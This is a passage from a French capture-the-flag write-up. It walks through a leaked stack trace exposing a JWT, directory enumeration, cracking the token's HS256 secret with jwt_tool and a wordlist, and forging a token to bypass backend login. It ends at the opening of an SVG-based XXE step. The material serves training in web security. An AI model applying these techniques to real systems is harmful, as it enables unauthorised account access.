</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=err>Fatal</span> <span class=err>error:</span> <span class=err>Uncaught</span> <span class=err>exception</span> <span class=err>&#39;Swift_TransportException&#39;</span> <span class=err>with</span> <span class=err>message</span> <span class=err>&#39;Expected</span> <span class=err>response</span> <span class=err>code</span> <span class=mi>354</span> <span class=err>but</span> <span class=err>got</span> <span class=err>code</span> <span class=s2>&#34;566&#34;</span><span class=err>,</span> <span class=err>with</span> <span class=err>message</span> <span class=s2>&#34;566 SMTP limit exceeded&#34;</span><span class=err>&#39;</span> <span class=err>in</span> <span class=err>/usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php:</span><span class=mi>386</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>Stack</span> <span class=err>trace:</span>
</span></span><span class=line><span class=cl><span class=err>#</span><span class=mi>0</span> <span class=err>/usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(</span><span class=mi>281</span><span class=err>):</span> <span class=err>Swift_Transport_AbstractSmtpTransport-&gt;_assertResponseCode(&#39;</span><span class=mi>566</span> <span class=err>SMTP</span> <span class=err>limit</span> <span class=err>...&#39;,</span> <span class=err>Array)</span>
</span></span><span class=line><span class=cl><span class=err>#</span><span class=mi>1</span> <span class=err>/usr/local/lib/php/Swift/Transport/EsmtpTransport.php(</span><span class=mi>245</span><span class=err>):</span> <span class=err>Swift_Transport_AbstractSmtpTransport-&gt;executeCommand(&#39;DATA\r\n&#39;,</span> <span class=err>Array,</span> <span class=err>Array)</span>
</span></span><span class=line><span class=cl><span class=err>#</span><span class=mi>2</span> <span class=err>/usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(</span><span class=mi>321</span><span class=err>):</span> <span class=err>Swift_Transport_EsmtpTransport-&gt;executeCommand(&#39;DATA\r\n&#39;,</span> <span class=err>Array)</span>
</span></span><span class=line><span class=cl><span class=err>#</span><span class=mi>3</span> <span class=err>/usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(</span><span class=mi>432</span><span class=err>):</span> <span class=err>Swift_Transport_AbstractSmtpTransport-&gt;_doDataCommand()</span>
</span></span><span class=line><span class=cl><span class=err>#</span><span class=mi>4</span> <span class=err>/usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(</span><span class=mi>449</span><span class=err>):</span> <span class=err>Swift_Transport_AbstractSmtpTransport-&gt;_doMailTransaction(Object(Swift_Message),</span> <span class=err>&#39;support@songboo...&#39;,</span> <span class=err>Array,</span> <span class=err>Array)</span>
</span></span><span class=line><span class=cl><span class=err>#</span><span class=mi>5</span> <span class=err>/usr/local/lib/php/Swift/Transport/Abstra</span> <span class=err>in</span> <span class=err>/usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php</span> <span class=err>on</span> <span class=err>line</span> <span class=mi>386</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>While</span> <span class=err>trying</span> <span class=err>to</span> <span class=err>send:</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;dest&#34;</span><span class=p>:[</span><span class=err>&#39;test&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;object&#34;</span><span class=p>:</span><span class=err>&#39;Password</span> <span class=err>reset</span> <span class=err>instructions</span> <span class=err>for</span> <span class=err>WillyWonka</span> <span class=err>Shop&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;from&#34;</span><span class=p>:</span><span class=err>&#39;admin@wwonka.shop&#39;</span><span class=p>,</span><span class=nt>&#34;relay&#34;</span><span class=p>:</span><span class=err>&#39;backend.willywonka.shop&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;content-html&#34;</span><span class=p>:</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl>        <span class=err>&lt;html&gt;</span>
</span></span><span class=line><span class=cl>            <span class=err>&lt;head&gt;</span>
</span></span><span class=line><span class=cl>                <span class=err>&lt;meta</span> <span class=err>http-equiv=</span><span class=s2>&#34;content-type&#34;</span> <span class=err>content=</span><span class=s2>&#34;text/html; charset=UTF-8&#34;</span><span class=err>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=err>&lt;title&gt;&lt;/title&gt;</span>
</span></span><span class=line><span class=cl>            <span class=err>&lt;/head&gt;</span>
</span></span><span class=line><span class=cl>            <span class=err>&lt;body</span> <span class=err>text=</span><span class=s2>&#34;#000000&#34;</span> <span class=err>bgcolor=</span><span class=s2>&#34;#FFFFFF&#34;</span><span class=err>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=err>&lt;b&gt;Hello</span> <span class=err>dear</span> <span class=err>associate</span><span class=p>,</span><span class=err>&lt;/b&gt;&lt;br&gt;</span>
</span></span><span class=line><span class=cl>                <span class=err>&lt;br&gt;</span>
</span></span><span class=line><span class=cl>                <span class=err>You</span> <span class=err>are</span> <span class=err>receiving</span> <span class=err>this</span> <span class=err>mail</span> <span class=err>after</span> <span class=err>a</span> <span class=err>password</span> <span class=err>reset</span> <span class=err>request</span> <span class=err>has</span> <span class=err>been</span>
</span></span><span class=line><span class=cl>                <span class=err>submitted</span> <span class=err>on</span> <span class=err>Willy</span> <span class=err>Wonka</span> <span class=err>Golden</span> <span class=err>Ticket</span> <span class=err>Shop.</span> <span class=err>&lt;br&gt;</span>
</span></span><span class=line><span class=cl>                <span class=err>&lt;br&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=err>In</span> <span class=err>order</span> <span class=err>to</span> <span class=err>reset</span> <span class=err>your</span> <span class=err>password,</span> <span class=err>please</span> <span class=err>use</span> <span class=err>this</span> <span class=err>login</span> <span class=err>link</span> <span class=err>and</span>
</span></span><span class=line><span class=cl>                <span class=err>reset</span> <span class=err>your</span> <span class=err>password</span> <span class=err>from</span> <span class=err>your</span> <span class=err>profile</span> <span class=err>&lt;br&gt;</span>
</span></span><span class=line><span class=cl>                <span class=err>&lt;br&gt;</span>
</span></span><span class=line><span class=cl>                <span class=err>&lt;i&gt;&lt;font</span> <span class=err>size=</span><span class=nt>&#34;+3&#34;</span><span class=err>&gt;&lt;a</span> <span class=err>moz-do-not-send=</span><span class=s2>&#34;true&#34;</span>
</span></span><span class=line><span class=cl>                <span class=err>href=</span><span class=s2>&#34;http://willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o&#34;</span><span class=err>&gt;Reset</span> <span class=err>my</span> <span class=err>password&lt;/a&gt;&lt;/font&gt;&lt;/i&gt;&lt;br&gt;</span>
</span></span><span class=line><span class=cl>                <span class=err>&lt;br&gt;</span>
</span></span><span class=line><span class=cl>                <span class=err>&lt;i&gt;&lt;b&gt;Note</span> <span class=p>:</span> <span class=err>if</span> <span class=err>you</span> <span class=err>didn&#39;t</span> <span class=err>request</span> <span class=err>this</span> <span class=err>email</span><span class=p>,</span> <span class=err>please</span> <span class=err>ensure</span> <span class=err>your</span>
</span></span><span class=line><span class=cl>                <span class=err>account</span> <span class=err>hasn&#39;t</span> <span class=err>been</span> <span class=err>accessed</span> <span class=err>and</span> <span class=err>perform</span> <span class=err>any</span> <span class=err>relevant</span> <span class=err>security</span>
</span></span><span class=line><span class=cl>                <span class=err>hardening.&lt;/b&gt;&lt;/i&gt;&lt;br&gt;</span>
</span></span><span class=line><span class=cl>                <span class=err>&lt;br&gt;</span>
</span></span><span class=line><span class=cl>                <span class=err>Have</span> <span class=err>a</span> <span class=err>nice</span> <span class=err>day&lt;br&gt;</span>
</span></span><span class=line><span class=cl>                <span class=err>&lt;br&gt;</span>
</span></span><span class=line><span class=cl>                <span class=err>Willy</span> <span class=err>Wonka&lt;br&gt;</span>
</span></span><span class=line><span class=cl>                <span class=err>&lt;a</span> <span class=err>moz-do-not-send=</span><span class=nt>&#34;true&#34;</span> <span class=err>href=</span><span class=s2>&#34;http://willywonka.shop/&#34;</span><span class=err>&gt;/&lt;/a&gt;&lt;br&gt;</span>
</span></span><span class=line><span class=cl>            <span class=err>&lt;/body&gt;</span>
</span></span><span class=line><span class=cl>        <span class=err>&lt;/html&gt;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;content-text&#34;</span><span class=p>:</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl>        <span class=err>Hello</span> <span class=err>dear</span> <span class=err>associate</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=err>You</span> <span class=err>are</span> <span class=err>receiving</span> <span class=err>this</span> <span class=err>mail</span> <span class=err>after</span> <span class=err>a</span> <span class=err>password</span> <span class=err>reset</span> <span class=err>request</span> <span class=err>has</span> <span class=err>been</span> <span class=err>submitted</span> <span class=err>on</span> <span class=err>Willy</span> <span class=err>Wonka</span> <span class=err>Golden</span> <span class=err>Ticket</span> <span class=err>Shop.</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=err>In</span> <span class=err>order</span> <span class=err>to</span> <span class=err>reset</span> <span class=err>your</span> <span class=err>password,</span> <span class=err>please</span> <span class=err>use</span> <span class=err>this</span> <span class=err>login</span> <span class=err>link</span> <span class=err>and</span> <span class=err>reset</span> <span class=err>your</span> <span class=err>password</span> <span class=err>from</span> <span class=err>your</span> <span class=err>profile</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=err>http:</span><span class=c1>//willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o
</span></span></span><span class=line><span class=cl><span class=c1></span>        
</span></span><span class=line><span class=cl>        <span class=err>Note</span> <span class=err>:</span> <span class=err>if</span> <span class=err>you</span> <span class=err>didn&#39;t</span> <span class=err>request</span> <span class=err>this</span> <span class=err>email,</span> <span class=err>please</span> <span class=err>ensure</span> <span class=err>your</span> <span class=err>account</span> <span class=err>hasn&#39;t</span> <span class=err>been</span> <span class=err>accessed</span> <span class=err>and</span> <span class=err>perform</span> <span class=err>any</span> <span class=err>relevant</span> <span class=err>security</span> <span class=err>hardening.</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=err>Have</span> <span class=err>a</span> <span class=err>nice</span> <span class=err>day</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=err>Willy</span> <span class=err>Wonka</span>
</span></span><span class=line><span class=cl>        <span class=err>http:</span><span class=c1>//willywonka.shop/&#39;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>Find</span> <span class=err>more</span> <span class=err>documentation</span> <span class=err>here</span> <span class=err>:</span>
</span></span><span class=line><span class=cl><span class=err>https:</span><span class=c1>//google.fr
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>https:</span><span class=c1>//stackoverflow.com
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>https:</span><span class=c1>//lmgtfy.com
</span></span></span></code></pre></td></tr></table></div></div><p>Cette trace divulgue des informations sensibles quant au SI de la cible :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>* backend.willywonka.shop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>* eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o
</span></span></code></pre></td></tr></table></div></div><h3 id=ii4-enumération-web-sur-le-backend>II.4. Enumération web sur le backend</h3><p>Nouveau site web, nouveau <code>dirsearch</code> : celui-ci renvoie énormément de <code>403</code>. Après un filtrage de qualité, le scan affiche des résultats pertinents :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://backend.willywonka.shop -e php,html,txt,pdf,zip -t <span class=m>25</span> <span class=p>|</span> grep -v <span class=m>403</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Target: https://backend.willywonka.shop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>11:44:07<span class=o>]</span> Starting: 
</span></span><span class=line><span class=cl><span class=o>[</span>11:44:07<span class=o>]</span> <span class=m>400</span> -  166B  - /%2e%2e/google.com
</span></span><span class=line><span class=cl><span class=o>[</span>11:44:32<span class=o>]</span> <span class=m>200</span> -    2KB - /login
</span></span><span class=line><span class=cl><span class=o>[</span>11:44:33<span class=o>]</span> <span class=m>302</span> -  219B  - /logout  -&gt;  http://backend.willywonka.shop/login
</span></span><span class=line><span class=cl><span class=o>[</span>11:44:37<span class=o>]</span> <span class=m>302</span> -  219B  - /reset  -&gt;  http://backend.willywonka.shop/login
</span></span></code></pre></td></tr></table></div></div><p>Les résultats sont relativement équivalents aux résultats du frontend. Cependant, on remarque que toutes les pages du backend sont redirigées vers une page de <code>/login</code>. Cette page attend un JSON Web Token (JWT) :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step2_backend_jwt.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step2_backend_jwt.png, /lib/images/writeups/2019_wonkachallenge/step2_backend_jwt.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step2_backend_jwt.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step2_backend_jwt.png title=/lib/images/writeups/2019_wonkachallenge/step2_backend_jwt.png></p><p>Le token contient :</p><blockquote><p>eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIk5vIHRva2VuIHByb3ZpZGVkIl19XX0.XSRiRw.QMJ9BsJX127QbsE-FgmcvQm-uBM</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;_flashes&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34; t&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;message&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;No token provided&#34;</span>
</span></span><span class=line><span class=cl>      <span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=ii5-craquer-le-secret-du-jwt>II.5. Craquer le secret du JWT</h3><p>En rassemblant les différents éléments du test d&rsquo;intrusion, on remarque rapidement que la stacktrace du frontend délivre un JWT et que le cookie du backend en attend un. L&rsquo;hypothèse la plus plausible est de récupérer le secret, modifier le JWT et signer le nouveau JWT. Ci-dessous le token de l&rsquo;utilisateur <code>aas</code> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx5d29ua2Euc2hvcCIsImlhdCI6MTU2MjY2NDMxNSwiZXhwIjoxNTYyNjk0MzE1fQ.6yuVpu_jugKOZL9p9-M-wAF6knpArUJqnfgQzS4W9N4
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;alg&#34;</span><span class=p>:</span> <span class=s2>&#34;HS256&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;typ&#34;</span><span class=p>:</span> <span class=s2>&#34;JWT&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;sub&#34;</span><span class=p>:</span> <span class=s2>&#34;aas&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;aud&#34;</span><span class=p>:</span> <span class=s2>&#34;frontend.willywonka.shop&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;iat&#34;</span><span class=p>:</span> <span class=mi>1563668653</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;exp&#34;</span><span class=p>:</span> <span class=mi>1563669253</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Afin de créer un nouveau jeton fonctionnel, on modifie les éléments suivants : <code>aud</code> et <code>exp</code>. Le premier élément permet de sélectionner le bon domaine. Le second correspond à l&rsquo;expiration du token, choisir une date suffisamment lointaine garantit la tranquillité. Modifier un JWT <code>HS256</code> est relativement simple. Il existe plusieurs outils efficaces, comme <code>jwt_tool</code>. En passant une wordlist pertinente en paramètre, cet outil peut bruteforce le secret du token :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ python ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o /opt/t/bf/rockyou.txt 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Token header values:
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=nv>typ</span> <span class=o>=</span> JWT
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=nv>alg</span> <span class=o>=</span> HS256
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Token payload values:
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=nv>sub</span> <span class=o>=</span> <span class=nb>test</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=nv>aud</span> <span class=o>=</span> frontend.willywonka.shop
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=nv>iat</span> <span class=o>=</span> <span class=m>1562664315</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> <span class=nv>exp</span> <span class=o>=</span> <span class=m>1562664915</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>######################################################</span>
</span></span><span class=line><span class=cl><span class=c1># Options:                                           #</span>
</span></span><span class=line><span class=cl><span class=c1># 1: Check CVE-2015-2951 - alg=None vulnerability    #</span>
</span></span><span class=line><span class=cl><span class=c1># 2: Check for Public Key bypass in RSA mode         #</span>
</span></span><span class=line><span class=cl><span class=c1># 3: Check signature against a key                   #</span>
</span></span><span class=line><span class=cl><span class=c1># 4: Check signature against a key file (&#34;kid&#34;)      #</span>
</span></span><span class=line><span class=cl><span class=c1># 5: Crack signature with supplied dictionary file   #</span>
</span></span><span class=line><span class=cl><span class=c1># 6: Tamper with payload data (key required to sign) #</span>
</span></span><span class=line><span class=cl><span class=c1># 0: Quit                                            #</span>
</span></span><span class=line><span class=cl><span class=c1>######################################################</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Please make a selection <span class=o>(</span>1-6<span class=o>)</span>
</span></span><span class=line><span class=cl>&gt; <span class=m>5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Loading key dictionary...
</span></span><span class=line><span class=cl>File loaded: /opt/t/bf/rockyou.txt
</span></span><span class=line><span class=cl>Testing <span class=m>14344380</span> passwords...
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> s3cr3t is the CORRECT key!
</span></span></code></pre></td></tr></table></div></div><p>Le secret a été cassé avec succès, il est possible de signer le nouveau jeton avec les paramètres suivants :</p><ul><li>aud : backend.willywonka.shop</li><li>exp : 1999999999 -> Une date aux alentours de 2033</li></ul><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step2_jwtcrafted.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step2_jwtcrafted.png, /lib/images/writeups/2019_wonkachallenge/step2_jwtcrafted.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step2_jwtcrafted.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step2_jwtcrafted.png title=/lib/images/writeups/2019_wonkachallenge/step2_jwtcrafted.png></p><p>Avec ce nouveau JWT, il est possible de passer outre l&rsquo;authentification et d&rsquo;accéder ainsi au backend de l&rsquo;application :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://backend.willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx5d29ua2Euc2hvcCIsImlhdCI6MTU2MjY2OTkxMiwiZXhwIjoxOTk5OTk5OTk5fQ.pZxLNOIrI1DCRdB-MBWDNtDnmeKeANTNm5btAoY6Pmw
</span></span></code></pre></td></tr></table></div></div><p>Conformément à l&rsquo;énoncé, le flag se situe dans les données du ticket <code>deadbeef</code> :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step2_auth_bypassed.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step2_auth_bypassed.png, /lib/images/writeups/2019_wonkachallenge/step2_auth_bypassed.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step2_auth_bypassed.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step2_auth_bypassed.png title=/lib/images/writeups/2019_wonkachallenge/step2_auth_bypassed.png></p><h3 id=ii6-flag>II.6. Flag</h3><blockquote><p>7ED33F3EB8E49C5E4BE6B8E2AE270E4018582B27E030D32DE4111DB585EE0318</p></blockquote><hr><h3 id=resources>Resources</h3><ol><li><strong>danielmiessler</strong>, <em>SecLists - top-usernames-shortlist.txt</em>, GitHub : <a href=https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt target=_blank rel="noopener noreffer">https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt</a></li><li><strong>Auth0</strong>, <em>JSON Web Token debugger</em>, jwt : <a href=https://jwt.io/ target=_blank rel="noopener noreffer">https://jwt.io/</a></li><li><strong>ticarpi</strong>, <em>jwt_tool</em>, GitHub : <a href=https://github.com/ticarpi/jwt_tool target=_blank rel="noopener noreffer">https://github.com/ticarpi/jwt_tool</a></li></ol><hr><hr><h2 id=iii-step-3---xxe-out-of-band>III. Step 3 - XXE Out-of-band</h2><blockquote><p>There&rsquo;s a flag.txt at the server root</p></blockquote><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/oob_xxe_dbz.png data-srcset="/lib/images/writeups/2019_wonkachallenge/oob_xxe_dbz.png, /lib/images/writeups/2019_wonkachallenge/oob_xxe_dbz.png 1.5x, /lib/images/writeups/2019_wonkachallenge/oob_xxe_dbz.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/oob_xxe_dbz.png title=/lib/images/writeups/2019_wonkachallenge/oob_xxe_dbz.png></p><h3 id=tldr-2>TL;DR</h3><ol><li>Forger une XXE OOB via le fichier SVG ;</li><li>Uploader le fichier SVG à l&rsquo;adresse : <code>http://willywonka.shop/profile?filetype=image%2fsvg%2bxml</code>, ne pas oublier de changer le MIME type ;</li><li>Remplir le formulaire avec <code>aas</code> en nom de victime et de la donnée random ;</li><li>Récupérer l&rsquo;id du ticket et y accéder dans le backend ;</li><li>Cliquer sur <code>autoresize</code> pour déclencher la XXE OOB.</li></ol><hr><h3 id=iii1-reconnaissance>III.1. Reconnaissance</h3><p>La <a href=https://challenge.akerva.com target=_blank rel="noopener noreffer">plateforme</a> du challenge propose un hint par épreuve. Celui de cette épreuve énonce clairement qu&rsquo;il s&rsquo;agit d&rsquo;une XXE via SVG. Le MIME type du fichier à envoyer est défini dans un paramètre GET, sur la page <code>submit</code> du <strong>frontend</strong>.</p><p>Il est possible pour un attaquant de changer ce MIME type et d&rsquo;uploader ainsi un fichier SVG XML contenant la charge de la XXE. Lorsque le ticket est correctement uploadé, un identifiant est généré. Cet identifiant permet d&rsquo;accéder au ticket dans le <strong>backend</strong>.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step3_frontendform.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step3_frontendform.png, /lib/images/writeups/2019_wonkachallenge/step3_frontendform.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step3_frontendform.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step3_frontendform.png title=/lib/images/writeups/2019_wonkachallenge/step3_frontendform.png></p><h3 